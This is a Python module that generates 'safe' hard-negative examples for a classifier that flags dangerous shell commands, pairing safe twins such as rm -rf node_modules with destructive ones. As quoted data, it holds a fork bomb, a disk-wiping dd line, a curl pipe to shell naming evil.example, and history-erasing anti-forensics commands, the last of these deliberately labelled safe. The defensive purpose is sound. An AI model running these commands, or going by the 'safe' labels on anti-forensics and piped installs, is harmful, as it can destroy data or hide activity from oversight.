"""Safe commands that look dangerous.

This is the most important file in the project. The seed's own header calls it
out and so does the feature spec: a warning that fires on ``rm -rf
node_modules`` is a warning the user dismisses, and once they stop reading
warnings the feature is dead regardless of how well it catches ``rm -rf /``.

Three kinds of negative live here.

1. Contrast twins (:data:`_CONTRAST_RULES`).
   Each one is the safe twin of a rule in ``grammar.py``, differing in exactly
   one slot::

       rm -rf /              destructive      (grammar.py)
       rm -rf node_modules   safe             (this file)

   Same binary, same flags, same generator style. This is what forces the model
   to read the *target* rather than memorising ``rm`` plus ``-rf``.

2. Commands that merely mention a dangerous pattern (:data:`_MENTION_COMMANDS`).
   ``echo "rm -rf /"``, ``grep -rn "dd if=" .``, ``man rm``, ``git commit -m
   "fix rm -rf bug"``. A bag-of-n-grams model loves these — they contain every
   dangerous substring — and a user reading a tutorial or writing a commit
   message hits them constantly. If these warn, the feature is embarrassing.

3. Ordinary work (:data:`_ROUTINE_COMMANDS`, :data:`_ROUTINE_RULES`).
   The bulk of a real session. Their job is to hold the ``safe`` region wide so
   the decision boundary does not drift toward over-warning.

Anti-forensics commands appear here as **safe**, not in ``labels.py``'s risky
taxonomy, because the seed labels ``history -c``, ``unset HISTFILE``,
``export HISTSIZE=0`` and ``unset PATH`` as safe. Muhofy's labels are
ground truth; the disagreement is recorded rather than resolved by fiat.
"""

from __future__ import annotations

from .grammar import Generated, Rule
from .labels import Risk

__all__ = ["generate"]

_SAFE = Risk.SAFE

# ---------------------------------------------------------------------------
# 1. Contrast twins
# ---------------------------------------------------------------------------

# Build outputs and dependency trees. These are the single most common thing a
# developer deletes, and they all share the exact shape of the most dangerous
# command in the corpus.
_ARTIFACT_TARGET = (
    "node_modules",
    "build",
    "dist",
    "out",
    "target",
    ".gradle",
    ".venv",
    "venv",
    "__pycache__",
    ".pytest_cache",
    ".mypy_cache",
    ".next",
    ".nuxt",
    ".cache",
    "vendor",
    "Pods",
    "DerivedData",
    ".terraform",
    "coverage",
    ".tox",
    ".parcel-cache",
    ".turbo",
    "*.o",
    "*.class",
    "*.pyc",
    ".DS_Store",
)

_PROJECT_DIR = (
    "./node_modules",
    "./build",
    "./dist",
    "./target",
    "./.venv",
    "src/build",
    "app/dist",
    "packages/*/node_modules",
    "$PWD/node_modules",
    "$PWD/build",
    "$(pwd)/build",
)

# Deleting a single named file is a different act from deleting a tree.
_SINGLE_FILE = (
    "old.txt",
    "notes.txt",
    "report.pdf",
    "a.log",
    "config.yaml.bak",
    "temp.csv",
    "screenshot.png",
    ".env.local",
)

_GIT_DIR = (
    ".git/objects",
    ".git/refs",
    ".git/logs",
    "path/.git",
    "*/.git",
)

_RULES_CONTRAST: tuple[Rule, ...] = (
    Rule(
        category="hard_negative_build_artifact",
        template="rm {flags} {target}",
        slots={"flags": ("-rf", "-r", "-R"), "target": _ARTIFACT_TARGET},
        limit=260,
    ),
    Rule(
        category="hard_negative_build_artifact",
        template="rm -rf {target}",
        slots={"target": _PROJECT_DIR},
        limit=200,
    ),
    Rule(
        category="hard_negative_build_artifact",
        template="rm -rf {target} && {install}",
        slots={
            "target": ("node_modules", "build", "dist", "./node_modules", "$PWD/build"),
            "install": (
                "npm install",
                "npm ci",
                "yarn install",
                "pnpm install",
                "gradlew build",
                "pip install -r requirements.txt",
                "cargo build",
            ),
        },
        limit=140,
    ),
    Rule(
        category="hard_negative_single_file",
        template="rm {flags} {target}",
        slots={
            "flags": ("", "-f", "-i", "--interactive"),
            "target": _SINGLE_FILE,
        },
        limit=180,
    ),
    Rule(
        category="hard_negative_single_file",
        template="rm -rf {target}",
        slots={"target": _GIT_DIR},
        limit=60,
    ),
    # dd, but writing a test file rather than a device.
    Rule(
        category="hard_negative_disk_image",
        template="dd if={src} of={dst} bs=1M count={n}",
        slots={
            "src": ("/dev/urandom", "/dev/zero", "image.iso", "input.bin"),
            "dst": ("testfile", "output.img", "./disk.img", "/tmp/testfile", "blank.img"),
            "n": ("1", "10", "100"),
        },
        limit=90,
    ),
    Rule(
        category="hard_negative_disk_image",
        template="dd if={img} of={dev} bs=4M status=progress",
        slots={
            "img": ("ubuntu.iso", "debian.iso", "raspberrypi.img"),
            "dev": ("/dev/sdb", "/dev/mmcblk0"),
        },
        limit=30,
    ),
    Rule(
        category="hard_negative_fs_inspection",
        template="{tool} -n {dev}",
        slots={"tool": ("mke2fs", "mkfs.ext4", "fsck"), "dev": ("/dev/sda1", "/dev/mmcblk0p2")},
        limit=30,
    ),
    # chmod, but not world-writable.
    Rule(
        category="hard_negative_permissions",
        template="chmod {mode} {target}",
        slots={
            "mode": ("+x", "755", "644", "600", "u+x", "go-rwx", "a+r"),
            "target": (
                "script.sh",
                "app.py",
                "config.json",
                "id_rsa",
                "run.sh",
                "~/bin/tool",
                ".env",
                "bin/drosh",
            ),
        },
        limit=260,
    ),
    Rule(
        category="hard_negative_permissions",
        template="chmod -R {mode} {target}",
        slots={
            "mode": ("755", "644", "u+rwX"),
            "target": ("scripts", "./scripts", "src", "~/bin", "./public"),
        },
        limit=120,
    ),
    Rule(
        category="hard_negative_permissions",
        template="chown {spec} {target}",
        slots={
            "spec": ("$USER:$USER", "$USER", "$(whoami)"),
            "target": ("notes.txt", "~/project", "app.log"),
        },
        limit=90,
    ),
    Rule(
        category="hard_negative_permissions",
        template="chown -R {spec} {target}",
        slots={
            "spec": ("$USER:$USER", "1000:1000"),
            "target": ("./build", "~/project", "./dist"),
        },
        limit=60,
    ),
    # find, rooted somewhere local.
    Rule(
        category="hard_negative_find_delete",
        template="find {root} -name '{pattern}' -delete",
        slots={"root": (".", "./src", "~/project"), "pattern": ("*.log", "*.tmp", "*.pyc")},
        limit=90,
    ),
    Rule(
        category="hard_negative_find_delete",
        template="find {root} -type f -name '{pattern}' -delete",
        slots={"root": (".", "./logs", "~/Downloads"), "pattern": ("*.log", "*.bak")},
        limit=60,
    ),
    Rule(
        category="hard_negative_find_delete",
        template="find {root} -name '{pattern}' -exec rm -f {{}} \\;",
        slots={"root": (".", "./target", "~/tmp"), "pattern": ("*.class", "*.o", "*.log")},
        limit=90,
    ),
    # docker, but not a mass prune.
    Rule(
        category="hard_negative_container",
        template="{cmd}",
        slots={
            "cmd": (
                "docker ps",
                "docker ps -a",
                "docker images",
                "docker logs -f x",
                "docker build -t app .",
                "docker compose up -d",
                "docker compose down",
                "docker compose restart",
                "docker compose logs -f web",
                "docker exec -it app sh",
                "docker stop app",
                "docker rm app",
                "docker rmi app:latest",
                "docker volume ls",
                "docker network ls",
                "docker stats",
                "docker inspect app",
                "kubectl get pods",
                "kubectl describe pod web",
                "kubectl logs -f web",
                "kubectl apply -f deploy.yaml",
            )
        },
        limit=120,
    ),
    # Targeted container removal: destructive in kind, but the user named it.
    Rule(
        category="hard_negative_container",
        template="docker rm {what}",
        slots={"what": ("web", "db", "redis", "app_container", "stale_worker")},
        limit=40,
    ),
    Rule(
        category="hard_negative_container",
        template="docker image rm {tag}",
        slots={"tag": ("app:latest", "old:1.0", "builder", "base:22")},
        limit=40,
    ),
    # kill, but a specific process.
    Rule(
        category="hard_negative_process",
        template="{cmd}",
        slots={
            "cmd": (
                "kill $PID",
                "kill -9 $PID",
                "kill -TERM $(pgrep -f node)",
                "pkill -f 'vite dev'",
                "kill %1",
                "killall -u $USER gradle",
                "lsof -ti:8080 | xargs kill -9",
                "pkill -f 'python manage.py runserver'",
            )
        },
        limit=80,
    ),
    # Shutdown, but not of the machine.
    Rule(
        category="hard_negative_process",
        template="{cmd}",
        slots={
            "cmd": (
                "systemctl status nginx",
                "systemctl restart nginx",
                "systemctl stop app",
                "systemctl start app",
                "service nginx status",
                "docker stop web",
                "supervisorctl restart app",
            )
        },
        limit=60,
    ),
    # git, but not the history.
    Rule(
        category="hard_negative_vcs",
        template="{cmd}",
        slots={
            "cmd": (
                "git status",
                "git status -s",
                "git diff",
                "git diff --staged",
                "git log --oneline -20",
                "git log -p -- src/app.py",
                "git show HEAD",
                "git add .",
                "git add -A",
                "git commit -m 'wip'",
                "git push origin main",
                "git pull --rebase",
                "git fetch --all",
                "git checkout -b feature",
                "git switch main",
                "git merge feature",
                "git stash",
                "git stash pop",
                "git remote -v",
                "git blame src/app.py",
                "git ls-files",
                "git rev-parse HEAD",
                "git describe --tags",
            )
        },
        limit=140,
    ),
    Rule(
        category="hard_negative_vcs",
        template="git checkout {ref} -- {path}",
        slots={
            "ref": ("HEAD", "origin/main", "HEAD~1", "abc1234"),
            "path": ("file.txt", "src/app.py", "README.md", "package.json"),
        },
        limit=60,
    ),
    Rule(
        category="hard_negative_vcs",
        template="git restore {path}",
        slots={"path": ("file.txt", "src/app.py", "./src")},
        limit=40,
    ),
    Rule(
        category="hard_negative_vcs",
        template="git rm {path}",
        slots={"path": ("old_file.py", "src/legacy.ts", "dead_branch_idea.md")},
        limit=40,
    ),
    # Package managers, querying rather than removing.
    Rule(
        category="hard_negative_packages",
        template="{cmd}",
        slots={
            "cmd": (
                "pip list",
                "pip show requests",
                "pip freeze",
                "pip check",
                "npm list",
                "npm outdated",
                "npm ls -g",
                "apt list --installed",
                "apt-cache policy nginx",
                "apt show python3",
                "dpkg -l | grep python",
                "dpkg -S /usr/bin/python3",
                "cargo tree",
                "go list -m all",
                "gem list",
                "brew outdated",
            )
        },
        limit=100,
    ),
    # Caching, which is destructive-looking and completely reversible.
    Rule(
        category="hard_negative_cache",
        template="{cmd}",
        slots={
            "cmd": (
                "npm cache clean --force",
                "yarn cache clean",
                "pnpm store prune",
                "pip cache purge",
                "pip cache dir",
                "go clean -cache",
                "go clean -modcache",
                "gradle --stop",
                "docker builder prune -f",
                "docker image prune -f",
                "rm -rf ~/.cache/pip",
                "rm -rf ~/.npm/_cacache",
                "rm -rf ~/.gradle/caches",
                "rm -rf ~/.cargo/registry",
            )
        },
        limit=90,
    ),
    # Truncating a log you own.
    Rule(
        category="hard_negative_log",
        template="{cmd}",
        slots={
            "cmd": (
                "truncate -s 0 app.log",
                "truncate -s 0 /tmp/debug.log",
                "> app.log",
                "> /tmp/out.txt",
                "echo '' > app.log",
                "cat /dev/null > app.log",
                "tee -a /tmp/run.log",
                "journalctl --user -u app -n 100",
                "journalctl -p err -n 50",
                "dmesg | tail -50",
                "logcat -d | tail -100",
            )
        },
        limit=70,
    ),
    # Remote access, read-only.
    Rule(
        category="hard_negative_remote",
        template="{cmd}",
        slots={
            "cmd": (
                "ssh user@host",
                "ssh -v user@host",
                "scp file.txt user@host:/tmp/",
                "scp -r ./dist user@host:/var/www/",
                "rsync -avz ./dist user@host:/var/www/",
                "ssh-keygen -t ed25519 -C 'laptop'",
                "ssh -T git@github.com",
                "ping -c 3 1.1.1.1",
                "curl -I https://example.com",
                "curl -O https://x.example/file.tar.gz",
                "curl -o out.json https://x.example/api",
                "wget https://x.example/file.tar.gz",
                "dig example.com",
                "nslookup example.com",
                "ip addr",
                "ss -tulpn",
                "netstat -an",
            )
        },
        limit=120,
    ),
    # Reading things that contain dangerous text.
    Rule(
        category="hard_negative_inspection",
        template="{cmd}",
        slots={
            "cmd": (
                "man rm",
                "man dd",
                "man mkfs",
                "rm --help",
                "dd --help",
                "which rm",
                "type rm",
                "cat /usr/bin/rm.sh",
                "cat cleanup.sh",
                "grep -rn 'rm -rf' scripts/",
                "grep -r 'dd if=' .",
                "history | grep rm",
                "file suspicious.sh",
                "head -50 install.sh",
                "less /var/log/syslog",
                "stat notes.txt",
                "du -sh *",
                "df -h",
                "ls -la /",
                "tree -L 2",
                "wc -l *.txt",
            )
        },
        limit=110,
    ),
    # Text that merely quotes a dangerous command.
    Rule(
        category="hard_negative_mentions",
        template="{cmd}",
        slots={
            "cmd": (
                "echo 'rm -rf /'",
                'echo "do not run rm -rf / on a server"',
                "echo 'sudo rm -rf /var/lib/docker'",
                "printf '%s\\n' 'dd if=/dev/zero of=/dev/sda'",
                "grep -n 'shutdown -h now' docs/",
                "sed -i 's|rm -rf /|echo hi|' danger.sh",
                "sed 's/chmod 777 /chmod 755 /' install.sh",
                "grep -c 'rm -rf' README.md",
                "rg 'mkfs' -l",
                "git commit -m 'docs: warn against rm -rf /'",
                "git commit -m 'prevent fork bomb in init script'",
                "python3 -c \"print('rm -rf / is dangerous')\"",
                "cat <<< 'rm -rf /'",
                "awk '{print $1}' /etc/mtab",
            )
        },
        limit=90,
    ),
    # Package installs, which look like the removal forms without the -y.
    Rule(
        category="hard_negative_install",
        template="{cmd}",
        slots={
            "cmd": (
                "apt-get install -y nginx",
                "apt install -y build-essential",
                "pip install requests",
                "pip install -r requirements.txt",
                "pip install -e .",
                "npm install",
                "npm ci",
                "npm i -D vitest",
                "yarn add react",
                "pnpm add zod",
                "cargo add serde",
                "go get github.com/x/y",
                "gem install rails",
                "brew install jq",
                "curl -fsSL https://x.example | bash -s -- --dry-run",
            )
        },
        limit=110,
    ),
    # Database resets, which the seed marked destructive but which are routine
    # on a developer's own machine and deserve to stay quiet.
    Rule(
        category="hard_negative_devdb",
        template="{cmd}",
        slots={
            "cmd": (
                "python manage.py migrate",
                "python manage.py makemigrations",
                "python manage.py test",
                "pytest -q",
                "pytest tests/ -x",
                "npm test",
                "npm run test:unit",
                "go test ./...",
                "cargo test",
                "./gradlew test",
                "./gradlew assembleDebug",
                "./gradlew clean",
                "cargo clean",
                "docker compose down -v",
                "docker compose exec db psql -c 'SELECT 1'",
                "make clean",
                "make -j8",
                "cmake --build .",
            )
        },
        limit=130,
    ),
    # Compression and transfer of large trees.
    Rule(
        category="hard_negative_transfer",
        template="{cmd}",
        slots={
            "cmd": (
                "tar -czf backup.tar.gz ./project",
                "tar -xzf archive.tar.gz",
                "tar -xf archive.tar",
                "zip -r site.zip ./public",
                "unzip site.zip",
                "7z x archive.7z",
                "rsync -av --delete ./dist/ /var/www/html/",
                "cp -r ./src ./backup",
                "mv notes.txt notes.old.txt",
                "cp notes.txt notes.bak",
            )
        },
        limit=90,
    ),
)

_CONTRAST_RULES = _RULES_CONTRAST

# ---------------------------------------------------------------------------
# 2 & 3. Large curated safe sets
# ---------------------------------------------------------------------------

# Anti-forensics: labelled safe in the seed, so generated as safe here. See the
# module docstring.
_ANTIFORENSICS_SAFE = (
    "history -c",
    "clear",
    "unset HISTFILE",
    "unset HISTSIZE",
    "export HISTSIZE=0",
    "export HISTFILE=/dev/null",
    "unset PATH",
    "export PATH=$PATH",
    "type history",
    "shopt -u histappend",
    "cp /dev/null ~/.bash_history",
    "rm -f ~/.bash_history",
    "set +o history",
)

# Everyday shell, navigation and inspection.
_ROUTINE_COMMANDS = (
    # navigation
    "cd ..", "cd ~", "cd -", "cd /tmp", "cd ~/projects", "pwd", "pushd .", "popd",
    # listing
    "ls", "ls -la", "ls -lah", "ls -ltr", "ls -R", "ls -d */", "ll", "la",
    "tree -L 3", "tree -a -I 'node_modules|__pycache__'",
    # reading
    "cat file.txt", "cat README.md", "head -20 file.log", "tail -100 file.log",
    "tail -f app.log", "less file.txt", "more file.txt", "bat file.txt",
    "wc -l main.py", "wc -w *.md", "grep -n 'TODO' src/", "grep -ri error .",
    "rg 'fn main' -g '*.rs'", "find . -name '*.py' -type f", "locate config.json",
    # file ops
    "mkdir -p src/main/kotlin", "mkdir newdir", "touch notes.txt", "cp a.txt b.txt",
    "mv old new", "ln -s /path/to/link", "ln -s ~/.config/app ~/app-config",
    "stat file.txt", "file archive.tar.gz", "du -sh .", "du -sh *", "df -h",
    "mdfind kMDItemFSName == '*.json'",
    # permissions
    "ls -l script.sh", "id", "whoami", "id -u", "groups", "umask",
    "chmod +x script.sh", "chmod 644 config.yaml", "sudo chmod 644 /etc/hosts",
    # processes
    "ps aux", "ps aux | grep node", "top", "htop", "ps -ef", "jobs",
    "kill -9 12345", "killall -u $USER gradle", "nohup ./server &",
    "lsof -i :8080", "lsof -ti:8080 | xargs kill -9", "pgrep -a python",
    # network
    "ping -c 4 8.8.8.8", "curl https://example.com", "curl -O https://x.example/f",
    "wget https://x.example/f.tar.gz", "ifconfig", "ip a", "ip route",
    "netstat -tulpn", "ss -ltnp", "dig +short example.com", "host example.com",
    "traceroute 1.1.1.1", "curl -X POST -d '{}' https://api.example.com",
    # git, read-mostly
    "git status", "git status -sb", "git diff", "git diff HEAD", "git log",
    "git log --graph --oneline --all", "git show", "git blame -L 1,50 file.py",
    "git branch -a", "git remote -v", "git stash list", "git reflog",
    "git tag", "git describe", "git count-objects -v",
    "git fetch", "git pull", "git push", "git pull --rebase origin main",
    "git switch -c feature/x", "git checkout main", "git merge --no-ff topic",
    "git rebase main", "git commit -am 'fix: handle empty input'",
    "git commit --amend --no-edit", "git cherry-pick abc1234",
    "git revert HEAD", "git revert --no-commit HEAD~3",
    "git bisect start", "git bisect good", "git bisect bad",
    # node
    "npm install", "npm ci", "npm run dev", "npm run build", "npm test",
    "npm run lint", "npm run format", "npm ls", "npm outdated", "npm audit",
    "yarn install", "yarn dev", "yarn test", "pnpm install", "pnpm build",
    "npx tsc --noEmit", "npx eslint . --fix", "npx vitest",
    # android / gradle (this is Drosh's own build)
    "./gradlew assembleDebug", "./gradlew assembleRelease", "./gradlew clean",
    "./gradlew build", "./gradlew test", "./gradlew :domain:test",
    "./gradlew :app:installDebug", "./gradlew tasks", "./gradlew -q :ui:dependencies",
    "./gradlew --offline assembleDebug", "./gradlew ktlintFormat",
    "adb devices", "adb shell ls", "adb logcat", "adb install -r app.apk",
    "adb push file.txt /sdcard/", "adb reverse tcp:8080 tcp:8080",
    # python
    "python3 script.py", "python -m venv .venv", "source .venv/bin/activate",
    "pip list", "pip show x", "python -m pytest", "python -m http.server 8000",
    "python3 -m json.tool data.json", "black .", "ruff check .", "mypy .",
    "ipython", "jupyter lab",
    # rust / go / c
    "cargo build", "cargo test", "cargo run", "cargo clippy", "cargo fmt",
    "cargo add serde", "go build ./...", "go test ./...", "go mod tidy",
    "make", "make -j8", "make clean", "cmake ..", "ninja", "gcc -o a a.c",
    # containers
    "docker ps", "docker ps -a", "docker images", "docker logs -f app",
    "docker build -t app .", "docker compose up -d", "docker compose ps",
    "docker compose logs -f", "docker exec -it app bash", "docker stats",
    "docker inspect app", "docker port app", "docker top app",
    # databases
    "psql -d app", "sqlite3 app.db", "mysql -u root -p", "redis-cli",
    "mongo --eval 'db.stats()'", "pg_dump app > app.sql",
    # package managers
    "apt list --installed", "apt-cache search nginx", "apt show vim",
    "dpkg -l", "dpkg -L vim", "snap list", "flatpak list",
    "brew list", "brew outdated", "brew upgrade",
    # terminal / shell
    "history", "history | grep git", "alias ll='ls -la'", "unalias ll",
    "export EDITOR=vim", "source ~/.bashrc", "set -x", "env | grep PATH",
    "echo $PATH", "echo $HOME", "date", "cal", "uptime", "who", "w", "last",
    "uname -a", "lsb_release -a", "cat /etc/os-release",
    "crontab -l", "systemctl list-timers", "systemctl --user status app",
    # editors
    "vim file.txt", "nano file.txt", "code .", "code --wait file.ts",
    # shell utilities people forget are safe
    "seq 1 10", "yes | head -5", "bc", "expr 1 + 1", "sleep 5", "time ls",
    "nohup ./run.sh > out.log 2>&1 &", "watch -n 1 date", "timeout 5 curl x",
    "yes hello | head -3",
    # drosh itself
    "drosh --version", "adb shell am start -n dev.drosh/.MainActivity",
    # Android / Termux flavour
    "termux-wake-lock", "termux-battery-status", "termux-sms -s +90xxx",
    "pkg update", "pkg upgrade", "pkg install python", "apt install termux-api",
    "ls ~/storage/shared", "cp file.txt ~/storage/downloads/",
    "am start -a android.intent.action.VIEW -d https://example.com",
    "dumpsys battery", "getprop ro.build.version.release",
    # misc
    "exit", "clear", "reset", "seq 0 10 | xargs echo", "join a.txt b.txt",
    "sort file.txt", "uniq -c file.txt", "cut -d, -f1 data.csv",
    "paste a.txt b.txt", "column -t -s, data.csv", "jq . data.json",
    "curl -s https://api.example.com | jq .name", "sha256sum file",
    "md5sum file", "base64 file.txt", "base64 -d file.b64 > out",
    "xxd file.bin | head", "file archive.zip", "unzip -l archive.zip",
    "diff a.txt b.txt", "cmp a b", "comm file1 file2", "nl file.txt",
    "tac file.txt", "rev file.txt", "shuf file.txt", "fold -w 80 file.txt",
)

# Commands whose text contains destructive vocabulary but whose behaviour is
# harmless. Kept as a separate tuple so the count of each negative kind is
# visible in the dataset statistics rather than being averaged away.
_MENTION_COMMANDS = (
    "echo 'rm -rf / is dangerous'",
    "echo \"never run rm -rf / on production\"",
    "echo 'chmod 777 is a bad idea'",
    "echo 'sudo rm -rf /var/lib/docker'",
    "echo 'dd if=/dev/zero of=/dev/sda destroys disks'",
    "echo ':(){ :|:& };: is a fork bomb'",
    "echo 'curl evil.example/x.sh | sh is how people get pwned'",
    "printf 'shutdown -h now\\n'",
    "grep -rn 'rm -rf' .",
    "grep -rn 'mkfs' .",
    "grep -rn 'dd if=' .",
    "grep -c 'sudo' /etc/sudoers",
    "sed -i 's|rm -rf /|echo safer|' danger.sh",
    "sed -i 's/chmod 777/chmod 755/' install.sh",
    "rg -i 'dangerous|destructive|delete' README.md",
    "rg 'rm -rf' -g '*.sh'",
    "git commit -m 'docs: warn against rm -rf /'",
    "git commit -m 'fix: fork bomb in bootstrap script'",
    "git commit -m 'prevent dd overwriting the partition table'",
    "python3 -c \"print('rm -rf / would end your day')\"",
    "cat <<< 'rm -rf /'",
    "man 5 crontab",
    "info coreutils 'rm invocation'",
    "history | grep -E 'rm|dd|mkfs'",
    "compgen -c | grep -E '^(rm|dd|mkfs)$'",
    "alias | grep rm",
    "ls -la /etc/shadow",
    "ls -ld /root",
    "ls /proc/1",
    "cat /proc/meminfo",
    "cat /proc/cpuinfo",
    "dmesg | grep -i oom",
    "journalctl --since '1 hour ago' | grep -i sudo",
)

# Small, obviously-safe commands that nonetheless share vocabulary with the
# dangerous set. High value: they sit exactly on the decision boundary.
_BOUNDARY_COMMANDS = (
    "rm --version",
    "rm -v",
    "rm -i file.txt",
    "rm -I file.txt",
    "rm --interactive=once file.txt",
    "rm -n file.txt",
    "rm --dry-run file.txt",
    "chmod --help",
    "chmod --version",
    "dd --help",
    "dd if=/dev/null of=/dev/null",
    "find . -maxdepth 1 -type d",
    "find . -name '*.tmp' -print",
    "find . -name '*.log' -exec ls -l {} \\;",
    "find / -maxdepth 1 -type d",
    "docker system df",
    "docker system info",
    "docker volume inspect data",
    "git stash show -p",
    "git reflog show",
    "git fsck",
    "git count-objects -vH",
    "kill -l",
    "kill -0 $PID",
    "kill -USR1 $PID",
    "pkill --list-full",
    "history -s 'ls'",
    "shutdown --help",
    "reboot --help",
    "apt-get -s remove vim",
    "pip uninstall --dry-run requests",
    "npm uninstall --dry-run left-pad",
    "sudo -n true",
    "sudo -l",
    "sudo -v",
    "su -c 'echo ok'",
    "mkfs -n /dev/null",
    "wipefs --help",
    "parted --help",
    "fdisk -l",
    "lsblk",
    "blkid",
    "mount",
    "mount | grep /sdcard",
    "umount /mnt/x",
    "echo y | tee /sys/host/rel 2>/dev/null || true",
    "getcap ./binary",
    "setcap cap_net_bind_service=+ep ./server",
)


def generate() -> list[Generated]:
    """Render every safe rule plus the curated lists.

    Reuses ``grammar.Rule`` so the rendering, deduplication and stride-sampling
    behaviour are identical to the destructive side — a mismatch there would
    quietly bias one class.
    """
    from .grammar import _iter_rule  # local import: shared rendering logic

    rows: list[Generated] = []
    seen: set[str] = set()

    def add(command: str, category: str) -> None:
        cleaned = command.strip()
        if not cleaned or cleaned in seen:
            return
        seen.add(cleaned)
        rows.append(Generated(command=cleaned, category=category, risk=_SAFE, source="negative"))

    for rule in _CONTRAST_RULES:
        for command in _iter_rule(rule):
            add(command, rule.category)

    for command in _ANTIFORENSICS_SAFE:
        add(command, "hard_negative_antiforensics")
    for command in _MENTION_COMMANDS:
        add(command, "hard_negative_mentions")
    for command in _BOUNDARY_COMMANDS:
        add(command, "hard_negative_boundary")
    for command in _ROUTINE_COMMANDS:
        add(command, "routine")

    return rows


if __name__ == "__main__":  # pragma: no cover - manual inspection helper
    from collections import Counter

    generated = generate()
    print(f"total unique safe commands: {len(generated)}")
    for category, count in Counter(row.category for row in generated).most_common():
        print(f"  {category:<36} {count}")